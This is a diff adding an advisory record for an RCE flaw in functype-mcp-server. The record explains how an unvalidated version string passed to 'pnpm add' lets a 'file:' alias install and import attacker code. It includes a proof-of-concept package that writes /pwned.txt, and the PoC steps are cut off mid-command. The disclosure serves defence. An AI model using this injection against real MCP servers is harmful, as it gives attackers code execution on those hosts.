@@ -1,0 +1,66 @@
+{
+  "schema_version": "0.1.0",
+  "id": "AGT-2026-0239",
+  "modified": "2026-11-02T19:45:10.888461676Z",
+  "published": "2026-09-09T23:49:20Z",
+  "aliases": [
+    "GHSA-wcjj-9m6g-2fr2",
+    "CVE-2026-59176"
+  ],
+  "summary": "functype-mcp-server: MCP `set_functype_version` Package Alias RCE via Unsanitized pnpm install + Dynamic Import",
+  "details": "## MCP `set_functype_version` Package Alias RCE via Unsanitized pnpm install + Dynamic Import\n\n### Summary\n\nThe `set_functype_version` MCP tool in `functype-mcp-server` accepts an unconstrained `version` string, interpolates it directly into an npm package specifier (`functype@<version>`), and installs it via `pnpm add` without any validation. Because npm/pnpm package specifiers support `file:`, `npm:`, and other alias syntaxes, an attacker who can send an MCP `tools/call` request to this tool can cause the server to install an arbitrary local or remote package as `functype`. Immediately after installation, the server calls `initDocsData(true)`, which dynamically imports `functype/cli` from the newly installed location, executing attacker-controlled JavaScript in the MCP server process. This results in full Remote Code Execution (RCE) with the privileges of the server process — full confidentiality, integrity, and availability impact (CVSS 7.8 High).\n\n### Details\n\nThe vulnerable code is in `packages/mcp-server/src/index.ts`. The `set_functype_version` tool is registered at line 115 and is enabled by default (no authentication required in stdio mode).\n\n**Source (user input accepted without validation):**\n```ts\n// packages/mcp-server/src/index.ts:119-121\nparameters: z.object({\n  version: z.string().describe('The functype version to install (e.g., \"0.46.0\", \"latest\", \"^0.45.0\")'),\n}),\n```\nOnly `z.string()` validation is applied — no semver format check, no allowlist for dist-tags, and no rejection of `file:`, `npm:`, URL, or path alias syntaxes.\n\n**Sink 1 — arbitrary package installation:**\n```ts\n// packages/mcp-server/src/index.ts:122-125\nexecute: async (args) => {\n  const spec = `functype@${args.version}`\n  try {\n    execFileSync(\"pnpm\", [\"add\", spec], { cwd: PROJECT_ROOT, stdio: \"pipe\", timeout: 60_000 })\n```\n`args.version` is interpolated into the package specifier string and passed directly to `pnpm add`. Supplying `file:/path/to/evil` causes pnpm to install an attacker-controlled directory as the `functype` package alias.\n\n**Sink 2 — dynamic import executes installed package code:**\n```ts\n// packages/mcp-server/src/lib/docs/data.ts:23-30\nif (force) {\n  const resolvedPath = require.resolve(\"functype/cli\")\n  cli = await import(`${pathToFileURL(resolvedPath).href}?t=${Date.now()}`)\n}\n```\n`initDocsData(true)` is called immediately after installation (line 134 in `index.ts`). It resolves `functype/cli` from the node_modules that now points to the attacker's package and dynamically imports it, executing any module-level code in the attacker's `cli.js` at import time.\n\n**Data flow summary:**\n1. `index.ts:115` — MCP tool `set_functype_version` registered, no auth required.\n2. `index.ts:119-121` — `version` accepted as raw `z.string()` (source).\n3. `index.ts:123` — `functype@${args.version}` constructed without sanitization.\n4. `index.ts:125` — `execFileSync(\"pnpm\", [\"add\", spec], ...)` installs attacker-controlled package (sink: arbitrary install).\n5. `index.ts:134` — `initDocsData(true)` called immediately.\n6. `data.ts:29-30` — `require.resolve(\"functype/cli\")` + dynamic `import()` executes attacker module (sink: RCE).\n\n### PoC\n\n**Step 1 — Prepare the attacker-controlled evil package:**\n```bash\nmkdir -p /tmp/evil\ncat > /tmp/evil/package.json <<'EOF'\n{\"name\":\"evil-functype\",\"version\":\"1.0.0\",\"type\":\"module\",\"exports\":{\"./cli\":\"./cli.js\"}}\nEOF\ncat > /tmp/evil/cli.js <<'EOF'\nimport { writeFileSync } from \"node:fs\";\nwriteFileSync(\"/pwned.txt\", \"RCE: mcp import-time code execution via set_functype_version\\n\");\nexport const TYPES = {};\nexport const INTERFACES = {};\nexport const CATEGORIES = {};\nexport const FULL_INTERFACES = {};\nexport const VERSION = \"1.0.0\";\nEOF\n```\n\n**Step 2 — Clone and build the victim monorepo at the affected version:**\n```bash\nTMP=\"$(mktemp -d)\"\ngit clone https://github.com/jordanburke/functype.git \"$TMP/functype\"\ncd \"$TMP/functype\"\ngit checkout v1.4.3\ncorepack enable\npnpm install --frozen-lockfile\npnpm -F functyp\n\nImported from OSV GHSA-wcjj-9m6g-2fr2.",
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://osv.dev/vulnerability/GHSA-wcjj-9m6g-2fr2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jordanburke/functype/security/advisories/GHSA-wcjj-9m6g-2fr2"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59176"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jordanburke/functype/commit/c0d58ad9c2a7d15c6117bd3adbbd75de37317dcf"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/jordanburke/functype"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jordanburke/functype/releases/tag/v1.4.4"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "functype-mcp-server"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.4.4"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "artifact_type": "mcp_server",
+    "classification": "vulnerable",
+    "verification": "verified",
+    "reporter": "osv-import",
+    "severity": "high"
+  }
+}
